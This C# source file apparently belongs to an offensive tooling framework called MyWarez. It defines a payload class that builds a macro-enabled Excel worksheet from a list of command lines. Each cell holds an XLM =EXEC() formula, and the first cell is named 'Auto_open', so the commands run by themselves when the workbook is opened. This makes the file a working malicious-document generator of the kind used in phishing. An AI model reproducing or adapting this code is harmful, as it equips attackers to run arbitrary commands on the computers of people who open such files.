using MyWarez.Core;
using System.Linq;

namespace MyWarez.Payloads
{
    public sealed class ExecCmdlineXlmMacro : ExcelWorksheet
    {
        public ExecCmdlineXlmMacro(ProcessList processList) : base(ProcessListToCellMatrix(processList), macroEnabled: true) { }
        private static ExcelCellMatrix ProcessListToCellMatrix(ProcessList processList)
        {
            var numRows = 1 + processList.Processes.Count();
            var c = 0;
            ExcelCell[][] cells = new ExcelCell[numRows][];
            var initR = 0;
            var r = initR;
            foreach (var process in processList.Processes)
            {
                cells[r] = new ExcelCell[c + 1];
                var macro = string.Format(@"=EXEC(""{0}"")", EscapeString(process.CmdLine.ToString()));
                if (r == initR)
                {
                    cells[r][c] = new ExcelCell(value: macro, name: "Auto_open");
                }
                else
                {
                    cells[r][c] = new ExcelCell(value: macro);
                }
                r++;
            }
            cells[r] = new ExcelCell[c + 1];
            cells[r][c] = new ExcelCell(value: "=HALT()");
            return new ExcelCellMatrix(cells);
        }
    }
}
